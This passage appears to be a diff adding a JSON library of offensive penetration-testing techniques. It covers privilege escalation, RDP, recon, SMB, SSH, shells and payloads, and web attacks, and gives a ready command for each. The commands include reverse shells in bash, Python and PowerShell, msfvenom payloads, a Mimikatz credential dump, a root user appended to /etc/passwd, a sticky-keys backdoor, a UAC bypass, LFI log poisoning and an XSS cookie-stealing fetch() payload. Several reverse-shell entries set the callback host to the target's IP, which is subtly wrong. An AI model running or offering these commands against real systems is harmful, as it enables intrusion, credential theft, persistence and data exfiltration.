+        "name": "netsh Port Forward (Windows)",
+        "purpose": "Forward port on Windows pivot host",
+        "when_to_use": "When pivot is a Windows machine",
+        "command": "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress={PIVOT_IP}",
+        "tags": [
+          "pivot",
+          "windows",
+          "netsh"
+        ]
+      }
+    ]
+  },
+  {
+    "category": "Privilege Escalation",
+    "techniques": [
+      {
+        "id": "pe_1",
+        "name": "LinPEAS Full Enum",
+        "purpose": "Automated Linux privilege escalation checks",
+        "when_to_use": "After getting initial shell on Linux",
+        "command": "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh 2>/dev/null | tee /tmp/lp_out.txt",
+        "tags": [
+          "privesc",
+          "linux",
+          "linpeas"
+        ]
+      },
+      {
+        "id": "pe_2",
+        "name": "WinPEAS Full Enum",
+        "purpose": "Automated Windows privilege escalation checks",
+        "when_to_use": "After getting initial shell on Windows",
+        "command": ".\\.\\winPEASx64.exe log > winpeas_out.txt",
+        "tags": [
+          "privesc",
+          "windows",
+          "winpeas"
+        ]
+      },
+      {
+        "id": "pe_3",
+        "name": "Sudo -l Check",
+        "purpose": "List commands current user can run as sudo",
+        "when_to_use": "First check on any Linux shell",
+        "command": "sudo -l 2>/dev/null",
+        "tags": [
+          "privesc",
+          "linux",
+          "sudo"
+        ]
+      },
+      {
+        "id": "pe_4",
+        "name": "SUID Binary Search",
+        "purpose": "Find SUID binaries exploitable for privesc",
+        "when_to_use": "Linux privilege escalation",
+        "command": "find / -perm -4000 -type f 2>/dev/null | xargs ls -la",
+        "tags": [
+          "privesc",
+          "linux",
+          "suid"
+        ]
+      },
+      {
+        "id": "pe_5",
+        "name": "Writable Files by Root",
+        "purpose": "Find files owned by root but writable",
+        "when_to_use": "Linux privilege escalation",
+        "command": "find / -writable -user root -type f 2>/dev/null | grep -v proc",
+        "tags": [
+          "privesc",
+          "linux"
+        ]
+      },
+      {
+        "id": "pe_6",
+        "name": "Crontab Enumeration",
+        "purpose": "Find writable cron jobs for privesc",
+        "when_to_use": "Linux privilege escalation",
+        "command": "cat /etc/crontab; ls -la /etc/cron*; crontab -l 2>/dev/null",
+        "tags": [
+          "privesc",
+          "linux",
+          "cron"
+        ]
+      },
+      {
+        "id": "pe_7",
+        "name": "Capabilities Search",
+        "purpose": "Find binaries with dangerous capabilities",
+        "when_to_use": "Linux privilege escalation",
+        "command": "getcap -r / 2>/dev/null",
+        "tags": [
+          "privesc",
+          "linux",
+          "capabilities"
+        ]
+      },
+      {
+        "id": "pe_8",
+        "name": "Writable /etc/passwd",
+        "purpose": "Add root user if /etc/passwd is writable",
+        "when_to_use": "When /etc/passwd is world-writable",
+        "command": "echo 'hacker:$(openssl passwd -1 hacked):0:0:root:/root:/bin/bash' >> /etc/passwd && su hacker",
+        "tags": [
+          "privesc",
+          "linux"
+        ]
+      },
+      {
+        "id": "pe_9",
+        "name": "NFS No_root_squash Exploit",
+        "purpose": "Get root via NFS misconfiguration",
+        "when_to_use": "When NFS share has no_root_squash",
+        "command": "showmount -e {TARGET_IP} && mount -t nfs {TARGET_IP}:/share /mnt && cp /bin/bash /mnt/bash && chmod +s /mnt/bash && /mnt/bash -p",
+        "tags": [
+          "privesc",
+          "linux",
+          "nfs"
+        ]
+      },
+      {
+        "id": "pe_10",
+        "name": "Token Impersonation (PrintSpoofer)",
+        "purpose": "Impersonate SYSTEM via SeImpersonatePrivilege",
+        "when_to_use": "When running as service account on Windows",
+        "command": ".\\PrintSpoofer64.exe -i -c cmd",
+        "tags": [
+          "privesc",
+          "windows",
+          "token"
+        ]
+      },
+      {
+        "id": "pe_11",
+        "name": "Token Impersonation (GodPotato)",
+        "purpose": "Escalate to SYSTEM via potato attack",
+        "when_to_use": "When SeImpersonatePrivilege is available",
+        "command": ".\\GodPotato.exe -cmd 'cmd /c whoami'",
+        "tags": [
+          "privesc",
+          "windows",
+          "potato"
+        ]
+      },
+      {
+        "id": "pe_12",
+        "name": "UAC Bypass via fodhelper",
+        "purpose": "Bypass UAC to get elevated shell",
+        "when_to_use": "When running as admin but UAC is blocking",
+        "command": "REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d 'cmd.exe' /f && REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /d '' /f && fodhelper.exe",
+        "tags": [
+          "privesc",
+          "windows",
+          "uac"
+        ]
+      },
+      {
+        "id": "pe_13",
+        "name": "Mimikatz Credential Dump",
+        "purpose": "Dump plaintext passwords and hashes from memory",
+        "when_to_use": "After gaining SYSTEM/admin on Windows",
+        "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" exit",
+        "tags": [
+          "privesc",
+          "windows",
+          "mimikatz"
+        ]
+      },
+      {
+        "id": "pe_14",
+        "name": "AlwaysInstallElevated Exploit",
+        "purpose": "Install MSI as SYSTEM",
+        "when_to_use": "When AlwaysInstallElevated registry keys are set",
+        "command": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && msfvenom -p windows/x64/shell_reverse_tcp LHOST={TARGET_IP} LPORT=4444 -f msi -o shell.msi && msiexec /quiet /qn /i shell.msi",
+        "tags": [
+          "privesc",
+          "windows",
+          "msi"
+        ]
+      }
+    ]
+  },
+  {
+    "category": "RDP Attacks",
+    "techniques": [
+      {
+        "id": "rdp_1",
+        "name": "RDP Login via xfreerdp",
+        "purpose": "Connect to Windows machine over RDP",
+        "when_to_use": "When port 3389 is open and you have credentials",
+        "command": "xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp",
+        "tags": [
+          "rdp",
+          "xfreerdp"
+        ]
+      },
+      {
+        "id": "rdp_2",
+        "name": "RDP Pass-the-Hash",
+        "purpose": "Authenticate to RDP using NTLM hash (no plaintext needed)",
+        "when_to_use": "When Restricted Admin Mode is enabled on target",
+        "command": "xfreerdp /v:{TARGET_IP} /u:{USERNAME} /pth:{PASSWORD} /cert:ignore +clipboard",
+        "tags": [
+          "rdp",
+          "pth",
+          "xfreerdp"
+        ]
+      },
+      {
+        "id": "rdp_3",
+        "name": "RDP with Domain",
+        "purpose": "RDP login specifying domain",
+        "when_to_use": "When target is domain-joined",
+        "command": "xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /d:{TARGET_DOMAIN} /cert:ignore +clipboard",
+        "tags": [
+          "rdp",
+          "domain",
+          "xfreerdp"
+        ]
+      },
+      {
+        "id": "rdp_4",
+        "name": "RDP Port Check + Encryption Info",
+        "purpose": "Verify RDP is open and get encryption details",
+        "when_to_use": "Initial enumeration",
+        "command": "nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 {TARGET_IP}",
+        "tags": [
+          "rdp",
+          "nmap"
+        ]
+      },
+      {
+        "id": "rdp_5",
+        "name": "RDP Brute Force via Hydra",
+        "purpose": "Brute force RDP credentials",
+        "when_to_use": "When RDP is open and you have a username list",
+        "command": "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt rdp://{TARGET_IP} -t 1 -W 3 -V",
+        "tags": [
+          "rdp",
+          "hydra",
+          "brute"
+        ]
+      },
+      {
+        "id": "rdp_6",
+        "name": "RDP via Proxychains (Pivot)",
+        "purpose": "Access RDP through a pivot host",
+        "when_to_use": "When RDP target is on internal network",
+        "command": "proxychains xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /cert:ignore",
+        "tags": [
+          "rdp",
+          "pivot",
+          "proxychains"
+        ]
+      },
+      {
+        "id": "rdp_7",
+        "name": "Enable RDP via Registry",
+        "purpose": "Enable RDP on compromised Windows host",
+        "when_to_use": "After gaining admin shell on Windows",
+        "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+        "tags": [
+          "rdp",
+          "windows",
+          "enable"
+        ]
+      },
+      {
+        "id": "rdp_8",
+        "name": "Enable RDP via PowerShell",
+        "purpose": "Enable RDP and disable NLA",
+        "when_to_use": "After gaining PowerShell access",
+        "command": "Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name fDenyTSConnections -Value 0; Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -Name UserAuthentication -Value 0",
+        "tags": [
+          "rdp",
+          "powershell",
+          "enable"
+        ]
+      },
+      {
+        "id": "rdp_9",
+        "name": "Add Firewall Rule for RDP",
+        "purpose": "Allow RDP through Windows firewall",
+        "when_to_use": "After enabling RDP if firewall blocks it",
+        "command": "netsh advfirewall firewall add rule name='RDP' protocol=TCP dir=in localport=3389 action=allow",
+        "tags": [
+          "rdp",
+          "firewall",
+          "windows"
+        ]
+      },
+      {
+        "id": "rdp_10",
+        "name": "RDP Session Hijack (SYSTEM)",
+        "purpose": "Hijack another user's active RDP session",
+        "when_to_use": "When SYSTEM privileges are available",
+        "command": "query session && tscon {SESSION_ID} /dest:{YOUR_SESSION}",
+        "tags": [
+          "rdp",
+          "hijack",
+          "privesc"
+        ]
+      },
+      {
+        "id": "rdp_11",
+        "name": "RDP Tunneling via SSH",
+        "purpose": "Tunnel RDP over SSH to bypass firewall",
+        "when_to_use": "When RDP is blocked but SSH is open",
+        "command": "ssh -L 13389:{TARGET_IP}:3389 {USERNAME}@{PIVOT_IP} -N && xfreerdp /v:127.0.0.1:13389 /u:{USERNAME} /p:{PASSWORD} /cert:ignore",
+        "tags": [
+          "rdp",
+          "ssh",
+          "tunnel"
+        ]
+      },
+      {
+        "id": "rdp_12",
+        "name": "Sticky Keys Backdoor",
+        "purpose": "Get SYSTEM shell from RDP login screen",
+        "when_to_use": "When you have admin access and want persistence",
+        "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\"",
+        "tags": [
+          "rdp",
+          "backdoor",
+          "persistence"
+        ]
+      }
+    ]
+  },
+  {
+    "category": "Recon",
+    "techniques": [
+      {
+        "id": "recon_1",
+        "name": "Whois Lookup",
+        "purpose": "Gather domain registration info, registrar, nameservers",
+        "when_to_use": "Early passive recon on a domain target",
+        "command": "whois {TARGET_DOMAIN}",
+        "tags": [
+          "recon",
+          "osint"
+        ]
+      },
+      {
+        "id": "recon_2",
+        "name": "DNS Full Record Dump",
+        "purpose": "Find all DNS records (A, MX, NS, TXT, CNAME)",
+        "when_to_use": "When targeting a domain",
+        "command": "dig any {TARGET_DOMAIN} @8.8.8.8",
+        "tags": [
+          "recon",
+          "dns"
+        ]
+      },
+      {
+        "id": "recon_3",
+        "name": "DNS Zone Transfer",
+        "purpose": "Dump all DNS records if misconfigured",
+        "when_to_use": "When DNS server allows zone transfers",
+        "command": "dig axfr {TARGET_DOMAIN} @{TARGET_IP}",
+        "tags": [
+          "recon",
+          "dns",
+          "zone-transfer"
+        ]
+      },
+      {
+        "id": "recon_4",
+        "name": "Subdomain Brute Force (gobuster)",
+        "purpose": "Discover hidden subdomains",
+        "when_to_use": "Web app recon phase",
+        "command": "gobuster dns -d {TARGET_DOMAIN} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50",
+        "tags": [
+          "recon",
+          "dns",
+          "gobuster"
+        ]
+      },
+      {
+        "id": "recon_5",
+        "name": "Subdomain Brute Force (ffuf)",
+        "purpose": "Fast subdomain discovery",
+        "when_to_use": "Alternative to gobuster for DNS fuzzing",
+        "command": "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{TARGET_DOMAIN} -H 'Host: FUZZ.{TARGET_DOMAIN}' -fs 0 -mc 200,301,302",
+        "tags": [
+          "recon",
+          "dns",
+          "ffuf"
+        ]
+      },
+      {
+        "id": "recon_6",
+        "name": "theHarvester OSINT",
+        "purpose": "Collect emails, subdomains, IPs from public sources",
+        "when_to_use": "Passive recon phase",
+        "command": "theHarvester -d {TARGET_DOMAIN} -b all -f harvest_output",
+        "tags": [
+          "recon",
+          "osint"
+        ]
+      },
+      {
+        "id": "recon_7",
+        "name": "Reverse DNS Lookup",
+        "purpose": "Find hostname from IP",
+        "when_to_use": "When you have an IP and need the hostname",
+        "command": "nslookup {TARGET_IP}",
+        "tags": [
+          "recon",
+          "dns"
+        ]
+      },
+      {
+        "id": "recon_8",
+        "name": "Certificate Transparency Search",
+        "purpose": "Find subdomains via SSL cert logs",
+        "when_to_use": "Passive subdomain enumeration",
+        "command": "curl -s 'https://crt.sh/?q=%.{TARGET_DOMAIN}&output=json' | jq '.[].name_value' | sort -u",
+        "tags": [
+          "recon",
+          "osint",
+          "ssl"
+        ]
+      },
+      {
+        "id": "recon_9",
+        "name": "Shodan Host Lookup",
+        "purpose": "Find open ports and services from internet",
+        "when_to_use": "External recon on target IP",
+        "command": "shodan host {TARGET_IP}",
+        "tags": [
+          "recon",
+          "osint",
+          "shodan"
+        ]
+      },
+      {
+        "id": "recon_10",
+        "name": "Google Dorking - Login Pages",
+        "purpose": "Find exposed login panels",
+        "when_to_use": "Web recon phase",
+        "command": "site:{TARGET_DOMAIN} inurl:login OR inurl:admin OR inurl:portal",
+        "tags": [
+          "recon",
+          "osint",
+          "google"
+        ]
+      }
+    ]
+  },
+  {
+    "category": "SMB Attacks",
+    "techniques": [
+      {
+        "id": "smb_1",
+        "name": "SMB Share Listing",
+        "purpose": "List all available SMB shares",
+        "when_to_use": "When SMB (445) is open",
+        "command": "smbclient -L //{TARGET_IP} -U '{USERNAME}%{PASSWORD}'",
+        "tags": [
+          "smb",
+          "enum"
+        ]
+      },
+      {
+        "id": "smb_2",
+        "name": "SMBMap Share Permissions",
+        "purpose": "Check read/write access on all shares",
+        "when_to_use": "After finding SMB shares",
+        "command": "smbmap -H {TARGET_IP} -u {USERNAME} -p {PASSWORD} -R",
+        "tags": [
+          "smb",
+          "smbmap"
+        ]
+      },
+      {
+        "id": "smb_3",
+        "name": "Connect to SMB Share",
+        "purpose": "Browse and download files from share",
+        "when_to_use": "When you have access to a share",
+        "command": "smbclient //{TARGET_IP}/share -U '{USERNAME}%{PASSWORD}'",
+        "tags": [
+          "smb",
+          "access"
+        ]
+      },
+      {
+        "id": "smb_4",
+        "name": "Download All Files from Share",
+        "purpose": "Recursively download share contents",
+        "when_to_use": "When you want to grab all files",
+        "command": "smbclient //{TARGET_IP}/share -U '{USERNAME}%{PASSWORD}' -c 'recurse ON; prompt OFF; mget *'",
+        "tags": [
+          "smb",
+          "download"
+        ]
+      },
+      {
+        "id": "smb_5",
+        "name": "CrackMapExec Full Enum",
+        "purpose": "Enumerate SMB info, users, shares, sessions",
+        "when_to_use": "Quick SMB recon with credentials",
+        "command": "crackmapexec smb {TARGET_IP} -u {USERNAME} -p {PASSWORD} --shares --users --sessions --loggedon-users",
+        "tags": [
+          "smb",
+          "cme"
+        ]
+      },
+      {
+        "id": "smb_6",
+        "name": "Pass-the-Hash via CME",
+        "purpose": "Authenticate using NTLM hash",
+        "when_to_use": "When you have NTLM hash but not plaintext password",
+        "command": "crackmapexec smb {TARGET_IP} -u {USERNAME} -H {PASSWORD} --shares",
+        "tags": [
+          "smb",
+          "pth",
+          "cme"
+        ]
+      },
+      {
+        "id": "smb_7",
+        "name": "PSExec Shell (Impacket)",
+        "purpose": "Get SYSTEM shell via SMB",
+        "when_to_use": "When you have admin credentials on Windows",
+        "command": "impacket-psexec {USERNAME}:{PASSWORD}@{TARGET_IP}",
+        "tags": [
+          "smb",
+          "psexec",
+          "shell"
+        ]
+      },
+      {
+        "id": "smb_8",
+        "name": "WMIExec Shell",
+        "purpose": "Execute commands via WMI (no service install)",
+        "when_to_use": "Stealthier alternative to PSExec",
+        "command": "impacket-wmiexec {USERNAME}:{PASSWORD}@{TARGET_IP}",
+        "tags": [
+          "smb",
+          "wmi",
+          "shell"
+        ]
+      },
+      {
+        "id": "smb_9",
+        "name": "SMBExec Shell",
+        "purpose": "Execute commands via SMB (no binary drop)",
+        "when_to_use": "When PSExec is blocked by AV",
+        "command": "impacket-smbexec {USERNAME}:{PASSWORD}@{TARGET_IP}",
+        "tags": [
+          "smb",
+          "shell",
+          "evasion"
+        ]
+      },
+      {
+        "id": "smb_10",
+        "name": "SecretsDump Remote",
+        "purpose": "Dump SAM/NTDS hashes remotely",
+        "when_to_use": "When you have admin access to Windows",
+        "command": "impacket-secretsdump {USERNAME}:{PASSWORD}@{TARGET_IP} -just-dc-ntlm",
+        "tags": [
+          "smb",
+          "hashes",
+          "impacket"
+        ]
+      },
+      {
+        "id": "smb_11",
+        "name": "Null Session Enumeration",
+        "purpose": "Enumerate SMB without credentials",
+        "when_to_use": "When SMB allows anonymous access",
+        "command": "enum4linux -a {TARGET_IP} 2>/dev/null | tee enum4linux.txt",
+        "tags": [
+          "smb",
+          "null",
+          "enum"
+        ]
+      },
+      {
+        "id": "smb_12",
+        "name": "Relay Attack (Responder + ntlmrelayx)",
+        "purpose": "Relay captured NTLM auth to another host",
+        "when_to_use": "When SMB signing is disabled on target",
+        "command": "impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'",
+        "tags": [
+          "smb",
+          "relay",
+          "ntlm"
+        ]
+      }
+    ]
+  },
+  {
+    "category": "SSH Attacks",
+    "techniques": [
+      {
+        "id": "ssh_1",
+        "name": "SSH Login",
+        "purpose": "Connect to remote host via SSH",
+        "when_to_use": "When SSH (22) is open and you have credentials",
+        "command": "ssh {USERNAME}@{TARGET_IP}",
+        "tags": [
+          "ssh"
+        ]
+      },
+      {
+        "id": "ssh_2",
+        "name": "SSH with Private Key",
+        "purpose": "Authenticate using SSH private key",
+        "when_to_use": "When you have found an id_rsa file",
+        "command": "chmod 600 id_rsa && ssh -i id_rsa {USERNAME}@{TARGET_IP}",
+        "tags": [
+          "ssh",
+          "key"
+        ]
+      },
+      {
+        "id": "ssh_3",
+        "name": "SSH on Non-Standard Port",
+        "purpose": "Connect to SSH running on alternate port",
+        "when_to_use": "When SSH is not on port 22",
+        "command": "ssh -p 2222 {USERNAME}@{TARGET_IP}",
+        "tags": [
+          "ssh",
+          "port"
+        ]
+      },
+      {
+        "id": "ssh_4",
+        "name": "SCP Upload File",
+        "purpose": "Upload file to remote host via SSH",
+        "when_to_use": "When transferring files to target",
+        "command": "scp /local/file.txt {USERNAME}@{TARGET_IP}:/tmp/file.txt",
+        "tags": [
+          "ssh",
+          "scp",
+          "transfer"
+        ]
+      },
+      {
+        "id": "ssh_5",
+        "name": "SCP Download File",
+        "purpose": "Download file from remote host",
+        "when_to_use": "When exfiltrating files from target",
+        "command": "scp {USERNAME}@{TARGET_IP}:/etc/passwd /tmp/passwd",
+        "tags": [
+          "ssh",
+          "scp",
+          "transfer"
+        ]
+      },
+      {
+        "id": "ssh_6",
+        "name": "SCP Download Directory",
+        "purpose": "Download entire directory recursively",
+        "when_to_use": "When exfiltrating multiple files",
+        "command": "scp -r {USERNAME}@{TARGET_IP}:/var/www/html /tmp/webroot",
+        "tags": [
+          "ssh",
+          "scp",
+          "transfer"
+        ]
+      },
+      {
+        "id": "ssh_7",
+        "name": "SSH Local Port Forward",
+        "purpose": "Forward a remote port to localhost",
+        "when_to_use": "To access internal services through SSH",
+        "command": "ssh -L 8080:{TARGET_IP}:80 {USERNAME}@{PIVOT_IP} -N -f",
+        "tags": [
+          "ssh",
+          "tunnel",
+          "pivot"
+        ]
+      },
+      {
+        "id": "ssh_8",
+        "name": "SSH Dynamic SOCKS Proxy",
+        "purpose": "Route all traffic through SSH SOCKS5 tunnel",
+        "when_to_use": "When pivoting into internal network",
+        "command": "ssh -D 1080 {USERNAME}@{PIVOT_IP} -N -f && proxychains nmap -sT {TARGET_IP}",
+        "tags": [
+          "ssh",
+          "socks",
+          "pivot"
+        ]
+      },
+      {
+        "id": "ssh_9",
+        "name": "SSH Remote Port Forward",
+        "purpose": "Expose internal port to attacker machine",
+        "when_to_use": "When getting reverse shell through firewall",
+        "command": "ssh -R 4444:localhost:4444 {USERNAME}@{TARGET_IP} -N",
+        "tags": [
+          "ssh",
+          "tunnel",
+          "reverse"
+        ]
+      },
+      {
+        "id": "ssh_10",
+        "name": "SSH Brute Force",
+        "purpose": "Brute force SSH credentials",
+        "when_to_use": "When SSH is open and no creds available",
+        "command": "hydra -l {USERNAME} -P /usr/share/wordlists/rockyou.txt ssh://{TARGET_IP} -t 4 -V",
+        "tags": [
+          "ssh",
+          "hydra",
+          "brute"
+        ]
+      },
+      {
+        "id": "ssh_11",
+        "name": "SSH Key Generation + Deploy",
+        "purpose": "Generate SSH key pair and add to target",
+        "when_to_use": "After gaining write access to ~/.ssh/",
+        "command": "ssh-keygen -t rsa -b 4096 -f /tmp/htb_key -N '' && cat /tmp/htb_key.pub >> /home/{USERNAME}/.ssh/authorized_keys && ssh -i /tmp/htb_key {USERNAME}@{TARGET_IP}",
+        "tags": [
+          "ssh",
+          "key",
+          "persistence"
+        ]
+      },
+      {
+        "id": "ssh_12",
+        "name": "SFTP Interactive Session",
+        "purpose": "Browse and transfer files interactively",
+        "when_to_use": "When you need to navigate remote filesystem",
+        "command": "sftp {USERNAME}@{TARGET_IP}",
+        "tags": [
+          "ssh",
+          "sftp",
+          "transfer"
+        ]
+      }
+    ]
+  },
+  {
+    "category": "Shells & Payloads",
+    "techniques": [
+      {
+        "id": "sh_1",
+        "name": "Netcat Listener",
+        "purpose": "Catch incoming reverse shell",
+        "when_to_use": "Before triggering reverse shell payload",
+        "command": "nc -lvnp 4444",
+        "tags": [
+          "shell",
+          "netcat",
+          "listener"
+        ]
+      },
+      {
+        "id": "sh_2",
+        "name": "Bash Reverse Shell",
+        "purpose": "Send reverse shell from Linux target",
+        "when_to_use": "When bash is available on target",
+        "command": "bash -i >& /dev/tcp/{TARGET_IP}/4444 0>&1",
+        "tags": [
+          "shell",
+          "bash",
+          "reverse"
+        ]
+      },
+      {
+        "id": "sh_3",
+        "name": "Python3 Reverse Shell",
+        "purpose": "Reverse shell via Python3",
+        "when_to_use": "When Python3 is available on target",
+        "command": "python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{TARGET_IP}',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh'])\"",
+        "tags": [
+          "shell",
+          "python",
+          "reverse"
+        ]
+      },
+      {
+        "id": "sh_4",
+        "name": "PowerShell Reverse Shell",
+        "purpose": "Reverse shell from Windows",
+        "when_to_use": "When PowerShell is available on Windows target",
+        "command": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{TARGET_IP}',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=[text.encoding]::ASCII.GetBytes($r2);$s.Write($sb,0,$sb.Length)}\"",
+        "tags": [
+          "shell",
+          "powershell",
+          "reverse"
+        ]
+      },
+      {
+        "id": "sh_5",
+        "name": "msfvenom Windows x64 EXE",
+        "purpose": "Generate Windows reverse shell payload",
+        "when_to_use": "When you can execute a binary on Windows",
+        "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={TARGET_IP} LPORT=4444 -f exe -o shell.exe",
+        "tags": [
+          "msfvenom",
+          "payload",
+          "windows"
+        ]
+      },
+      {
+        "id": "sh_6",
+        "name": "msfvenom PHP Webshell",
+        "purpose": "Generate PHP reverse shell payload",
+        "when_to_use": "When you can upload PHP files",
+        "command": "msfvenom -p php/reverse_php LHOST={TARGET_IP} LPORT=4444 -f raw -o shell.php",
+        "tags": [
+          "msfvenom",
+          "payload",
+          "php"
+        ]
+      },
+      {
+        "id": "sh_7",
+        "name": "msfvenom Linux ELF",
+        "purpose": "Generate Linux reverse shell binary",
+        "when_to_use": "When you can execute binaries on Linux",
+        "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={TARGET_IP} LPORT=4444 -f elf -o shell.elf && chmod +x shell.elf",
+        "tags": [
+          "msfvenom",
+          "payload",
+          "linux"
+        ]
+      },
+      {
+        "id": "sh_8",
+        "name": "msfvenom ASP Webshell",
+        "purpose": "Generate ASP reverse shell for IIS",
+        "when_to_use": "When you can upload to IIS server",
+        "command": "msfvenom -p windows/shell_reverse_tcp LHOST={TARGET_IP} LPORT=4444 -f asp -o shell.asp",
+        "tags": [
+          "msfvenom",
+          "payload",
+          "asp"
+        ]
+      },
+      {
+        "id": "sh_9",
+        "name": "Upgrade Shell to TTY",
+        "purpose": "Get fully interactive shell",
+        "when_to_use": "After catching a basic reverse shell",
+        "command": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' && export TERM=xterm",
+        "tags": [
+          "shell",
+          "tty",
+          "upgrade"
+        ]
+      },
+      {
+        "id": "sh_10",
+        "name": "Full TTY Upgrade (stty)",
+        "purpose": "Get fully interactive shell with Ctrl+C support",
+        "when_to_use": "After python pty spawn",
+        "command": "# In reverse shell: python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# Press Ctrl+Z, then in local terminal:\nstty raw -echo; fg\n# Then in shell:\nexport TERM=xterm; stty rows 40 cols 200",
+        "tags": [
+          "shell",
+          "tty",
+          "upgrade"
+        ]
+      },
+      {
+        "id": "sh_11",
+        "name": "Evil-WinRM Shell",
+        "purpose": "Get PowerShell shell via WinRM",
+        "when_to_use": "When WinRM (5985) is open and you have credentials",
+        "command": "evil-winrm -i {TARGET_IP} -u {USERNAME} -p {PASSWORD}",
+        "tags": [
+          "shell",
+          "winrm",
+          "windows"
+        ]
+      },
+      {
+        "id": "sh_12",
+        "name": "Evil-WinRM with Hash",
+        "purpose": "WinRM shell using NTLM hash",
+        "when_to_use": "When you have NTLM hash",
+        "command": "evil-winrm -i {TARGET_IP} -u {USERNAME} -H {PASSWORD}",
+        "tags": [
+          "shell",
+          "winrm",
+          "pth"
+        ]
+      }
+    ]
+  },
+  {
+    "category": "Web Attacks",
+    "techniques": [
+      {
+        "id": "web_1",
+        "name": "SQLMap Auto Exploit",
+        "purpose": "Detect and exploit SQL injection automatically",
+        "when_to_use": "When a parameter is potentially injectable",
+        "command": "sqlmap -u 'http://{TARGET_IP}/page?id=1' --dbs --batch --level 3 --risk 2 --random-agent",
+        "tags": [
+          "sqli",
+          "sqlmap"
+        ]
+      },
+      {
+        "id": "web_2",
+        "name": "SQLMap POST Data",
+        "purpose": "Test POST parameters for SQLi",
+        "when_to_use": "Login forms or POST-based inputs",
+        "command": "sqlmap -u 'http://{TARGET_IP}/login' --data='user={USERNAME}&pass={PASSWORD}' --dbs --batch --level 5",
+        "tags": [
+          "sqli",
+          "sqlmap"
+        ]
+      },
+      {
+        "id": "web_3",
+        "name": "SQLMap OS Shell",
+        "purpose": "Get OS command execution via SQLi",
+        "when_to_use": "When SQLi exists and DB user has FILE privilege",
+        "command": "sqlmap -u 'http://{TARGET_IP}/page?id=1' --os-shell --batch",
+        "tags": [
+          "sqli",
+          "sqlmap",
+          "rce"
+        ]
+      },
+      {
+        "id": "web_4",
+        "name": "LFI Basic Test",
+        "purpose": "Read local files via path traversal",
+        "when_to_use": "When a file parameter exists in URL",
+        "command": "curl 'http://{TARGET_IP}/page?file=../../../../etc/passwd'",
+        "tags": [
+          "lfi",
+          "web"
+        ]
+      },
+      {
+        "id": "web_5",
+        "name": "LFI via PHP Filter (Source Read)",
+        "purpose": "Read PHP source code via base64 filter",
+        "when_to_use": "When LFI exists and target runs PHP",
+        "command": "curl 'http://{TARGET_IP}/page?file=php://filter/convert.base64-encode/resource=index.php' | base64 -d",
+        "tags": [
+          "lfi",
+          "php"
+        ]
+      },
+      {
+        "id": "web_6",
+        "name": "LFI Log Poisoning (Apache)",
+        "purpose": "Turn LFI into RCE via log injection",
+        "when_to_use": "When LFI can read /var/log/apache2/access.log",
+        "command": "curl -s 'http://{TARGET_IP}/' -H 'User-Agent: <?php system($_GET[\"cmd\"]); ?>' && curl 'http://{TARGET_IP}/page?file=../../../../var/log/apache2/access.log&cmd=id'",
+        "tags": [
+          "lfi",
+          "rce",
+          "log-poison"
+        ]
+      },
+      {
+        "id": "web_7",
+        "name": "File Upload Bypass (Magic Bytes)",
+        "purpose": "Bypass file type checks with magic bytes",
+        "when_to_use": "When upload only allows images",
+        "command": "echo -e '\\xff\\xd8\\xff<?php system($_GET[\"cmd\"]); ?>' > shell.php.jpg",
+        "tags": [
+          "upload",
+          "bypass"
+        ]
+      },
+      {
+        "id": "web_8",
+        "name": "Command Injection Test",
+        "purpose": "Execute OS commands via web input",
+        "when_to_use": "When user input is passed to OS commands",
+        "command": "curl 'http://{TARGET_IP}/ping?ip=127.0.0.1;id'",
+        "tags": [
+          "cmdi",
+          "web"
+        ]
+      },
+      {
+        "id": "web_9",
+        "name": "XSS Cookie Steal",
+        "purpose": "Steal session cookies via XSS",
+        "when_to_use": "When reflected/stored XSS exists",
+        "command": "<script>fetch('http://{TARGET_IP}:8080/?c='+btoa(document.cookie))</script>",
+        "tags": [
+          "xss",
+          "web"
+        ]
+      },
+      {
+        "id": "web_10",
+        "name": "FFUF Parameter Fuzzing",
+        "purpose": "Discover hidden GET parameters",
+        "when_to_use": "When fuzzing web app parameters",
+        "command": "ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://{TARGET_IP}/page?FUZZ=test' -fs 0",
+        "tags": [
